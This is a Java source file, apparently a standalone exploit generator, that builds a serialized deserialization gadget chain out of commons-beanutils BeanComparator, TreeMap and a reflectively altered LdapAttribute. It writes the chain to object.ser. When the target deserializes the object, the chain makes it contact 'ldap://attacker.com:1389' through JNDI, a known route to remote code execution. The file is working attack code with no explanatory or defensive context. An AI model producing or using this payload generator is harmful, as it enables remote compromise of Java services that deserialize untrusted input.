import org.apache.commons.beanutils.BeanComparator;

import javax.naming.CompositeName;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.TreeMap;

public class PayloadGenerator {

    public static void main(String[] args) throws Exception {

        String ldapCtxUrl = "ldap://attacker.com:1389";
        
        Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
                new Class[] {String.class});
        ldapAttributeClazzConstructor.setAccessible(true);
        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
                new Object[] {"name"});

        Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField("baseCtxURL");
        baseCtxUrlField.setAccessible(true);
        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);

        Field rdnField = ldapAttributeClazz.getDeclaredField("rdn");
        rdnField.setAccessible(true);
        rdnField.set(ldapAttribute, new CompositeName("a//b"));
        
        // Generate payload
        BeanComparator comparator = new BeanComparator("class");
        TreeMap treeMap1 = new TreeMap(comparator);
        treeMap1.put(ldapAttribute, "aaa");
        TreeMap treeMap2 = new TreeMap(comparator);
        treeMap2.put(ldapAttribute, "aaa");
        HashMap hashMap = new HashMap();
        hashMap.put(treeMap1, "bbb");
        hashMap.put(treeMap2, "ccc");

        Field propertyField = BeanComparator.class.getDeclaredField("property");
        propertyField.setAccessible(true);
        propertyField.set(comparator, "attributeDefinition");

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("object.ser"));
        oos.writeObject(hashMap);
        oos.close();

    }

}